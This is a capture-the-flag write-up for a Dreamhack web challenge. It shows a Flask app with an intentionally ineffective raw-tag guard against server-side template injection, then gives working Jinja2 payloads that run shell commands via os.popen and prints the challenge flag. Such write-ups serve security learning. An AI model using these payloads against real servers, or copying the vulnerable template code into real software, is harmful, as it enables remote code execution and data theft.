# easy server side
> **Description**
> Let's practice the server side!
> 
> 2025.10.19 03:03 Uninten Edit
> [Link](https://dreamhack.io/wargame/challenges/2364)

In this challenge, we are provided with two files: app.py and admin.py.

app.py
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        user_input = request.form.get('input', '')
        template = f'''
        <h1>Output:</h1>
        {{ {{% raw %}} {{ {user_input} }} {{% endraw %}} }}
        <form method="POST">
            Input: <input type="text" name="input" value="{user_input}">
            <input type="submit" value="Render">
        </form>
        '''
        return render_template_string(template, config=app.config)
    return '''
    <form method="POST">
        Input: <input type="text" name="input">
        <input type="submit" value="Render">
    </form>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

admin.py
```python
from flask import Flask, request

app = Flask('internal')

FLAG = "DH{Fake_Flag}"

@app.route('/auth', methods=['POST'])
def auth():
    data = request.get_json() or request.form.to_dict()
    if data.get('user') == 'admin' and data.get('pass') == 'admin':
        return {'success': True, 'flag': FLAG}
    return {'error': 'Invalid'}

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5001, debug=False)
```
First, analyzing app.py, we notice a critical detail in how the template is constructed:
```python
template = f'''
        <h1>Output:</h1>
        {{ {{% raw %}} {{ {user_input} }} {{% endraw %}} }}
```
The data is passed directly into the `user_input` variable via an f-string. The author attempted to prevent SSTI by wrapping the input in `{{% raw %}}` tags. However, this mitigation is ineffective because the raw block only prevents the execution of expressions explicitly contained within it. 
Since the outer double curly braces `{{ ... }}` remain active, if we input `{{7*7}}`, the f-string interpolation results in a structure like `{{{{7*7}}}}`. The server then renders the inner expression, processing it as valid Jinja2 syntax, and returns `49`.
From this observation, we can see that bypassing the filter to execute an SSTI payload is straightforward.
First, we need to identify the filename containing the flag. We can achieve this by accessing the os module to execute a shell command:
`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
The server responds with the directory listing:
```os
Dockerfile 
Specfile 
admin 
app.py 
public usr
```
We can see the target file -> `Specfile`. Now, we simply proceed to read this file to retrieve the flag:
`{{config.__class__.__init__.__globals__['os'].popen('cat Specfile').read()}}`
Upon injecting this payload, we receive the response containing the flag:
```os
title = easy server side 
tags = web 
flag = DH{1f3fa07521dafa1798ed4f66baf7187118a898df0b367e2784967f076eadf3a2}

[vm] os = linux 
memory = 256 
disk = 1024 
ports = 5000/tcp 
allow_outgoing = 
True docker_compose = False
```
